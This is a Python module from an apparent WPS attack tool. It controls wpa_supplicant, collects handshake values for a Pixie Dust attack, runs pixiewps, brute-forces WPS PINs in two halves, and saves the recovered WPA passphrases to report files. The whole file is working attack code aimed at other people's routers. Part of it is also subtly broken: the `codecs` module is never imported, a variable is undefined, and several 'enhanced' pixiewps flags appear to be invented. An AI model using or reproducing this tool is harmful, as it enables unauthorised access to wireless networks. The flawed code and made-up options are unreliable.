#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import csv
import time
import socket
import pathlib
import tempfile
import shutil
import subprocess
import collections
import statistics
from datetime import datetime

from .utils import get_hex, recvuntil
from .wps import WPSpin

class WPSState:
    """Class for tracking WPS protocol state"""
    IDLE = 0
    SCANNING = 1
    AUTHENTICATING = 2
    ASSOCIATING = 3
    WPS_START = 4
    WPS_M1 = 5
    WPS_M2 = 6
    WPS_M3 = 7
    WPS_M4 = 8
    WPS_M5 = 9
    WPS_M6 = 10
    WPS_M7 = 11
    WPS_M8 = 12
    WPS_DONE = 13
    WPS_FAIL = 14
    WPS_TIMEOUT = 15

    @staticmethod
    def to_string(state):
        states = {
            0: 'IDLE',
            1: 'SCANNING',
            2: 'AUTHENTICATING',
            3: 'ASSOCIATING', 
            4: 'WPS_START',
            5: 'WPS_M1',
            6: 'WPS_M2',
            7: 'WPS_M3',
            8: 'WPS_M4',
            9: 'WPS_M5',
            10: 'WPS_M6',
            11: 'WPS_M7',
            12: 'WPS_M8',
            13: 'WPS_DONE',
            14: 'WPS_FAIL',
            15: 'WPS_TIMEOUT'
        }
        return states.get(state, 'UNKNOWN')

class PixiewpsData:
    """Class for storing Pixiewps attack data with enhanced chipset support"""
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''
        self.r_nonce = ''  # Added for newer algorithms
        self.e_bssid = ''  # Added for newer algorithms
        self.e_snonce = '' # Added for some Broadcom routers
        self.r_snonce = '' # Added for some Broadcom routers
        self.e_manufacturer = ''  # Added for manufacturer specific attacks
        self.e_model = ''        # Added for model specific attacks
        self.e_version = ''      # Added for version specific attacks
        self.key_version = 0x10  # Default WPS key version

    def clear(self):
        self.__init__()

    def got_all(self):
        """Check if we have all required data for basic Pixie Dust attack"""
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def got_extended(self):
        """Check if we have extended data for advanced attacks"""
        return (self.got_all() and self.r_nonce and self.e_bssid)

    def get_pixie_cmd(self, full_range=False, advanced=True):
        """Generate Pixiewps command with support for multiple algorithms"""
        pixiecmd = ["pixiewps"]
        
        # Basic parameters
        pixiecmd.extend([
            "--pke", self.pke,
            "--pkr", self.pkr,
            "--e-hash1", self.e_hash1,
            "--e-hash2", self.e_hash2,
            "--authkey", self.authkey,
            "--e-nonce", self.e_nonce
        ])

        # Extended parameters for newer algorithms
        if advanced and self.got_extended():
            pixiecmd.extend([
                "--r-nonce", self.r_nonce,
                "--bssid", self.e_bssid
            ])

        # Optional parameters for specific chipsets
        if self.e_snonce:
            pixiecmd.extend(["--e-snonce", self.e_snonce])
        if self.r_snonce:
            pixiecmd.extend(["--r-snonce", self.r_snonce])
        
        # Version specific parameters
        if self.key_version != 0x10:
            pixiecmd.extend(["--wps-version", str(self.key_version)])

        # Manufacturer specific optimizations
        if self.e_manufacturer:
            pixiecmd.extend(["--vendor", self.e_manufacturer])
        
        # Force full range if requested
        if full_range:
            pixiecmd.append("--force")
            
        # Additional optimizations
        pixiecmd.extend([
            "--dh-small",  # Use small DH keys when possible
            "--mode", "3",  # Try all known algorithms
            "--verbosity", "3"  # Increased verbosity for debugging
        ])

        return " ".join(pixiecmd)


class ConnectionStatus:
    """Class for storing WPS connection status with enhanced state tracking"""
    def __init__(self):
        self.state = WPSState.IDLE
        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.bssid = ''
        self.retry_count = 0
        self.max_retries = 3
        self.timeout = 30  # Default timeout in seconds
        self.last_state_change = time.time()

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def setState(self, new_state):
        if new_state != self.state:
            self.state = new_state
            self.last_state_change = time.time()
            print(f'[*] State changed to: {WPSState.to_string(new_state)}')

    def isTimedOut(self):
        return (time.time() - self.last_state_change) > self.timeout

    def canRetry(self):
        return self.retry_count < self.max_retries

    def incrementRetry(self):
        self.retry_count += 1
        return self.canRetry()

    def clear(self):
        self.__init__()


class BruteforceStatus:
    """Class for storing bruteforce progress"""
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   # Last PIN attempt start time
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.start_time, average_pin_time))

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class Companion:
    """Main WPS connection handler class"""
    def __init__(self, interface, save_result=False, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/../reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()

    def __init_wpa_supplicant(self):
        print('[*] Running wpa_supplicant…')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.connection_status.setState(WPSState.WPS_M1 + n - 1)
                print('[*] Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self.connection_status.setState(WPSState.WPS_M1 + n - 1)
                print('[*] Received WPS Message M{}'.format(n))
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.connection_status.setState(WPSState.WPS_FAIL)
                print('[*] Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.setState(WPSState.WPS_DONE)
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
            elif 'WPS-TIMEOUT' in line:
                self.connection_status.setState(WPSState.WPS_TIMEOUT)
                print('[!] WPS operation timed out')
            elif 'WPS-FAIL' in line:
                self.connection_status.setState(WPSState.WPS_FAIL)
                print('[-] WPS operation failed')

            # Additional data collection for enhanced Pixie Dust attack
            if pixiemode:
                if 'Registrar Nonce' in line and 'hexdump' in line:
                    self.pixie_creds.r_nonce = get_hex(line)
                    if verbose:
                        print('[P] R-Nonce: {}'.format(self.pixie_creds.r_nonce))
                elif 'Enrollee SNonce' in line and 'hexdump' in line:
                    self.pixie_creds.e_snonce = get_hex(line)
                    if verbose:
                        print('[P] E-SNonce: {}'.format(self.pixie_creds.e_snonce))
                elif 'Registrar SNonce' in line and 'hexdump' in line:
                    self.pixie_creds.r_snonce = get_hex(line)
                    if verbose:
                        print('[P] R-SNonce: {}'.format(self.pixie_creds.r_snonce))
                elif 'Manufacturer' in line:
                    self.pixie_creds.e_manufacturer = line.split(':', 1)[1].strip()
                    if verbose:
                        print('[P] Manufacturer: {}'.format(self.pixie_creds.e_manufacturer))
                elif 'Model Name' in line:
                    self.pixie_creds.e_model = line.split(':', 1)[1].strip()
                    if verbose:
                        print('[P] Model: {}'.format(self.pixie_creds.e_model))
                elif 'Model Number' in line:
                    self.pixie_creds.e_version = line.split(':', 1)[1].strip()
                    if verbose:
                        print('[P] Version: {}'.format(self.pixie_creds.e_version))
                elif 'OS Version' in line:
                    version = line.split(':', 1)[1].strip()
                    if '1.0' in version:
                        self.pixie_creds.key_version = 0x10
                    elif '2.0' in version:
                        self.pixie_creds.key_version = 0x20
                    if verbose:
                        print('[P] WPS Version: {}'.format(hex(self.pixie_creds.key_version)))
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                self.connection_status.setState(WPSState.SCANNING)
                print('[*] Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            self.connection_status.setState(WPSState.WPS_FAIL)
            print('[-] wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            self.connection_status.setState(WPSState.AUTHENTICATING)
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Authenticating…')
        elif 'Authentication response' in line:
            print('[+] Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            self.connection_status.setState(WPSState.ASSOCIATING)
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                print('[+] Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                print('[+] Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print('[*] Received Identity Request')
        elif 'using real identity' in line:
            print('[*] Sending Identity Response…')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print('[*] Selected AP: {}'.format(bssid))
        elif 'Deauthentication notification' in line:
            print('[!] Received deauthentication notification')
        elif 'Association request to the driver failed' in line:
            print('[!] Association request failed')
            if self.connection_status.canRetry():
                time.sleep(2)  # Wait before retry
                return True
        elif 'CTRL-EVENT-DISCONNECTED' in line:
            print('[!] Disconnected from AP')
            if self.connection_status.canRetry():
                time.sleep(2)  # Wait before retry
                return True

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        """Enhanced Pixiewps execution with multiple attack strategies"""
        print("[*] Running Pixiewps with enhanced algorithms...")
        
        # Try different attack strategies in order of likelihood
        strategies = [
            ("Default", lambda: self.pixie_creds.get_pixie_cmd(full_range, advanced=True)),
            ("Legacy", lambda: self.pixie_creds.get_pixie_cmd(full_range, advanced=False)),
            ("Broadcom", lambda: self.pixie_creds.get_pixie_cmd(full_range, advanced=True) + " --ecos-ver 2"),
            ("Ralink", lambda: self.pixie_creds.get_pixie_cmd(full_range, advanced=True) + " --ecos-ver 1"),
            ("MediaTek", lambda: self.pixie_creds.get_pixie_cmd(full_range, advanced=True) + " --ecos-ver 3")
        ]
        
        for strategy_name, cmd_generator in strategies:
            cmd = cmd_generator()
            if showcmd:
                print(f"[*] Trying {strategy_name} strategy:")
                print(cmd)
            
            print(f"[*] Attempting {strategy_name} Pixie Dust attack...")
            
            try:
                r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE, encoding='utf-8',
                                 errors='replace', timeout=60)
            except subprocess.TimeoutExpired:
                print(f"[-] {strategy_name} strategy timed out")
                continue

            if r.returncode == 0:
                print(r.stdout)
                lines = r.stdout.splitlines()
                for line in lines:
                    if ('[+]' in line) and ('WPS pin' in line):
                        pin = line.split(':')[-1].strip()
                        if pin == '<empty>':
                            pin = "''"
                        print(f"[+] {strategy_name} strategy successful!")
                        return pin
            else:
                if verbose:
                    print(f"[-] {strategy_name} strategy failed:")
                    print(r.stderr)
        
        print("[-] All Pixie Dust strategies failed")
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"[+] WPS PIN: '{wps_pin}'")
        print(f"[+] WPA PSK: '{wpa_psk}'")
        print(f"[+] AP SSID: '{essid}'")

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        dateStr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        print('[i] PIN saved in {}'.format(filename))

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print(f'PINs generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)
            while 1:
                pinNo = input('Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                    else:
                        raise IndexError
                except Exception:
                    print('Invalid number')
                else:
                    break
        elif len(pins) == 1:
            pin = pins[0]
            print('[i] The only probable PIN is selected:', pin['name'])
            pin = pin['pin']
        else:
            return None
        return pin

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)   # Clean the pipe

        def handle_timeout():
            print('[!] Connection timed out, retrying...')
            if self.connection_status.incrementRetry():
                self.sendOnly('WPS_CANCEL')
                time.sleep(1)  # Give time for cleanup
                return self.__wps_connection(bssid, pin, pixiemode, pbc_mode, verbose)
            else:
                print('[-] Maximum retries reached')
                return False

        def handle_deauth():
            print('[!] Deauthenticated, attempting to reconnect...')
            if self.connection_status.incrementRetry():
                time.sleep(2)  # Wait before retry
                return self.__wps_connection(bssid, pin, pixiemode, pbc_mode, verbose)
            else:
                print('[-] Maximum retries reached')
                return False

        if pbc_mode:
            if bssid:
                print(f"[*] Starting WPS push button connection to {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print("[*] Starting WPS push button connection…")
                cmd = 'WPS_PBC'
        else:
            print(f"[*] Trying PIN '{pin}'…")
            cmd = f'WPS_REG {bssid} {pin}'

        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return False

        self.connection_status.setState(WPSState.WPS_START)

        while True:
            if self.connection_status.isTimedOut():
                return handle_timeout()

            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
            if not res:
                break

            if 'Deauthentication notification' in str(res):
                return handle_deauth()

            if self.connection_status.status == 'WSC_NACK':
                if self.connection_status.state >= WPSState.WPS_M5:
                    print('[!] Late stage WPS failure - could be wrong second half of pin')
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                if self.connection_status.canRetry():
                    print('[!] WPS failure detected, retrying...')
                    self.sendOnly('WPS_CANCEL')
                    time.sleep(1)
                    return self.__wps_connection(bssid, pin, pixiemode, pbc_mode, verbose)
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        if not pin:
            if pixiemode:
                try:
                    # Try using the previously calculated PIN
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                # If not pixiemode, ask user to select a pin from the list
                pin = self.__prompt_wpspin(bssid) or '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print("\nAborting…")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                # Try to remove temporary PIN file
                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print('[!] Not enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                # Saving Pixiewps calculated PIN if can't connect
                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        """
        @f_half — 4-character string
        """
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print('[+] First half found')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print('[-] First half not found')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        """
        @f_half — 4-character string
        @s_half — 3-character string
        """
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if (not start_pin) or (len(start_pin) < 4):
            # Trying to restore previous session
            try:
                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                with open(filename, 'r') as file:
                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and (self.connection_status.status != 'GOT_PSK'):
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print("\nAborting…")
            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
            with open(filename, 'w') as file:
                file.write(self.bruteforce.mask)
            print('[i] Session saved in {}'.format(filename))

    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)

    def __del__(self):
        self.cleanup() 